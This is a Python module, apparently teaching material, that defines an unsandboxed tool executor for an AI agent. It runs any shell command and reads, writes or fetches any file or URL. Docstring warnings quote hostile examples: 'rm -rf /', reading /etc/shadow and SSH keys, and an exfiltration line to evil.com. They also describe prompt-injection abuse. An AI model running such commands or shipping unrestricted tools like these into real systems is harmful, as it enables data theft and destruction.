"""
Tool Executor for the AI Agent
================================
This module defines the actual system operations the AI agent can perform.
Think of these as the 'hands' of the agent — they let it interact with the OS.

Why this is dangerous: Without sandboxing, these tools give the agent
unrestricted access to run ANY shell command, read ANY file, write ANYWHERE,
and make ANY network request. A prompt-injected agent could abuse these
to exfiltrate data, delete files, or install malware.
"""

import subprocess
import os
import urllib.request
import json


class ToolExecutor:
    """Executes actions requested by the AI agent.
    
    Each method maps to a specific type of system interaction:
    - run_shell: Execute arbitrary shell commands
    - read_file: Read contents of any file
    - write_file: Write content to any file
    - http_request: Make HTTP GET requests to any URL
    """

    def execute(self, action: dict) -> dict:
        """Route an action dict to the appropriate tool method.
        
        Args:
            action: Dict with 'action' key and action-specific parameters.
                    e.g., {'action': 'run_shell', 'command': 'ls /tmp'}
        
        Returns:
            Dict with 'status' ('success' or 'error') and result data.
        """
        action_type = action.get("action", "")

        if action_type == "run_shell":
            return self.run_shell(action.get("command", ""))
        elif action_type == "read_file":
            return self.read_file(action.get("path", ""))
        elif action_type == "write_file":
            return self.write_file(action.get("path", ""), action.get("content", ""))
        elif action_type == "http_request":
            return self.http_request(action.get("url", ""))
        elif action_type == "respond":
            # The agent just wants to send a text response (no system interaction)
            return {"status": "success", "message": action.get("message", "")}
        else:
            return {"status": "error", "message": f"Unknown action type: {action_type}"}

    def run_shell(self, command: str) -> dict:
        """Execute a shell command and return its output.
        
        WARNING: This runs the command with the same privileges as this Python
        process. Without sandboxing, this could run 'rm -rf /' or 'curl evil.com'.
        """
        try:
            result = subprocess.run(
                command,
                shell=True,              # Run through /bin/sh
                capture_output=True,     # Capture stdout and stderr
                text=True,               # Return strings, not bytes
                timeout=30               # Kill if takes longer than 30s
            )
            return {
                "status": "success",
                "stdout": result.stdout,
                "stderr": result.stderr,
                "returncode": result.returncode
            }
        except subprocess.TimeoutExpired:
            return {"status": "error", "message": "Command timed out (30s limit)"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def read_file(self, path: str) -> dict:
        """Read and return the contents of a file.
        
        WARNING: Without sandboxing, can read /etc/shadow, SSH keys, etc.
        """
        try:
            with open(path, 'r') as f:
                content = f.read()
            return {"status": "success", "content": content}
        except PermissionError:
            return {"status": "error", "message": f"Permission denied: {path}"}
        except FileNotFoundError:
            return {"status": "error", "message": f"File not found: {path}"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def write_file(self, path: str, content: str) -> dict:
        """Write content to a file (creates or overwrites).
        
        WARNING: Without sandboxing, could overwrite system files or create
        malicious scripts anywhere on the filesystem.
        """
        try:
            # Create parent directories if they don't exist
            os.makedirs(os.path.dirname(path) or '.', exist_ok=True)
            with open(path, 'w') as f:
                f.write(content)
            return {"status": "success", "message": f"Written {len(content)} chars to {path}"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def http_request(self, url: str) -> dict:
        """Make an HTTP GET request and return the response.
        
        WARNING: Without sandboxing, could exfiltrate data to attacker servers
        (e.g., curl http://evil.com/steal?data=<sensitive_data>).
        """
        try:
            req = urllib.request.Request(url, headers={'User-Agent': 'AgentHarness/1.0'})
            response = urllib.request.urlopen(req, timeout=10)
            # Limit response to 2000 chars to avoid memory issues
            content = response.read().decode('utf-8', errors='replace')[:2000]
            return {
                "status": "success",
                "url": url,
                "status_code": response.status,
                "content": content
            }
        except Exception as e:
            return {"status": "error", "message": str(e)}
